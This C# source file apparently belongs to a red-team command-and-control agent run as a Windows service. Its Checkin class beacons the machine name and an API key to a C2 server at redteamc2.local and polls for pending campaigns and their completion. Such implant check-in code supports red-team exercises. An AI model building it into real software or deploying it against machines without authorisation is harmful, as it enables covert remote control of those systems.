using Newtonsoft.Json;
namespace App.WindowsService;

public class Checkin
{
    public bool GetPendingC2op(Config config, Campaign campaign)
    {
        using(var client = new HttpClient())
        {
            var postData = new Dictionary<string, string>
            {
                { "API_KEY", $"{config.api_key}" }
            };
            var content = new FormUrlEncodedContent(postData);
            try
            {
                var endpoint = new Uri($"http://redteamc2.local:8888/endpoints/agent/get-pending/{Environment.MachineName}");
                var result = client.PostAsync(endpoint, content).Result;
                var statusCode = (int)result.StatusCode;
                if (statusCode == 200)
                {
                    var json = result.Content.ReadAsStringAsync().Result;
                    var data = JsonConvert.DeserializeObject<CheckinReponse>(json);
                    if (data != null)
                    {
                        if (data.IsPending)
                        {
                            campaign.CampaignUUID = data.CampaignUUID;
                        }
                        return data.IsPending;
                    }
                }
            }
            catch
            {
                return false;
            }
            
            return false;
        }
    }

    public bool IsCampaignComplete(Config config, Campaign campaign)
    {
        using (var client = new HttpClient())
        {
            var postData = new Dictionary<string, string>
            {
                { 
                    "API_KEY", $"{config.api_key}"
                },
                {
                    "CAMPAIGN_UUID", $"{campaign.CampaignUUID}"
                }
            };
            var content = new FormUrlEncodedContent(postData);
            try
            {
                var endpoint = new Uri($"http://redteamc2.local:8888/endpoints/agent/is-campaign-complete");
                var result = client.PostAsync(endpoint, content).Result;
                var statusCode = (int)result.StatusCode;
                if (statusCode == 200)
                {
                    var json = result.Content.ReadAsStringAsync().Result;
                    var data = JsonConvert.DeserializeObject<CampaignResponse>(json);
                    if (data != null)
                    {
                        return data.result;
                    }
                }
            }
            catch
            {
                return false;
            }

            return false;
        }
    }
}

public class CheckinReponse
{
    public bool IsPending { get; set; }
    public string? CampaignUUID { get; set; }
}

public class CampaignResponse
{
    public bool result { get; set; }
}